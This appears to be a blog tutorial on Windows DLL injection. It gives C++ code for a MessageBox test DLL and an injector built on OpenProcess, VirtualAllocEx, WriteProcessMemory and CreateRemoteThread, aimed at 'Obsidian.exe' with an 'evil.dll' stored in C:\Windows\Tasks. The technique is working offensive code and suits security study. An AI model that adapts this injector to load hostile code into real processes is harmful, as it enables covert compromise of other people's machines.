---
title: Windows DLL Injection using CreateRemoteThread
layout: post
---

# Building the injector
---
When it comes to DLL injection, there are many ways of doing it, such as using the WindowsAPI, or even undocumented [NTAPI](http://undocumented.ntinternals.net/) functions such as `NtCreateThread`.

In this example I will be using C++ to inject our DLL into a process using the `CreateRemoteThread` function.

## Payload
---
Our payload is a simple C++ DLL, which calls the `MessageBox` windows API call, to make a textbox appear when run.

```cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "pch.h"

extern "C" __declspec(dllexport)
DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBoxA(NULL, "Test", "hello", NULL);
    return 0;
}

extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


## Retrieving the process id
----

For us to be able to inject our DLL into a process, we need to get the PID (process id) of the process.  
  
The way that this can be done. Is by taking a snapshot of the current processes on the system, comparing the name of the exe file to the one we provide, and returning the pid of the process with the matching executable name.

![pid](https://imgur.com/PM6qzpo.png)

```cpp
int getPID(const char* pName) {

	HANDLE snapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL result;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (snapshot == INVALID_HANDLE_VALUE) return 0;

	pe.dwSize = sizeof(pe);
	result = Process32First(snapshot, &pe);

	while (result) {
		if (strcmp(pName, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		result = Process32Next(snapshot, &pe);
	}
	CloseHandle(snapshot);
	return pid;
}
```

If we entered "Calculator.exe". The `getPID()` function would return `11448` back to the main function.


## Making the CreateRemoteThread()  call
---

![dll](https://rioasmara.files.wordpress.com/2020/09/dll.png)

First of all we need to get the process handle, this can be done with `OpenProcess`. The following code opens an existing local process object, and gives us the `PROCESS_ALL_ACCESS` access right to the process.

```cpp
	char process[] = "Obsidian.exe";
	DWORD pid = getPID(process);
	const char* dll = "C:\\Windows\\Tasks\\evil.dll";
	size_t sz = strlen(dll);

	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
```

Next, we must obstain the address of the `LoadLibrary` function using the `kernel32.dll` library.

```c++
	HMODULE hModule = GetModuleHandle("kernel32.dll");
	LPVOID lpStart = GetProcAddress(hModule, "LoadLibraryA");
```

Following that, the allocation of a new memory region in the process memory, with the `MEM_COMMIT` and `MEM_REVERSE` allocation types, which allow us to reserve and commit memory pages in the target process.

```cpp
	lpBase = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

After that, write to the processes memory space.

```cpp

WriteProcessMemory(hProc, lpBase, dll, sz, NULL);
```

`hProc` - The handle to the process memory to be modified
`lpBaseAddres` - Pointer to the base address in process
`lpBuffer` - Pointer to the buffer that contains the DLL (C:\\path\\to.dll)
`nSize` - Number of bytes to be written (size of DLL path)

Finally, we create the remote thread which injects the DLL into the targets address space.

```cpp
HANDLE rThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpStart, lpBase, 0, NULL);
```

If this succeeds, we can close the handle to the proccess:

```cpp
	if (rThread == NULL) {
		std::cout << "[!] CreateRemoteThread Failed.";
	}
	else {
		std::cout << "[+] CreateRemoteThread Created.";
		CloseHandle(hProc);
	}
```

Upon execution of the injector, we see the CreateRemoteThread() is created and the DLL is executed.

![exec](https://imgur.com/tkH4Y7z.png)

We can also attach x64dbg and see the DLL being loaded and executed.

![debug](https://imgur.com/Tsy8yVy.png)
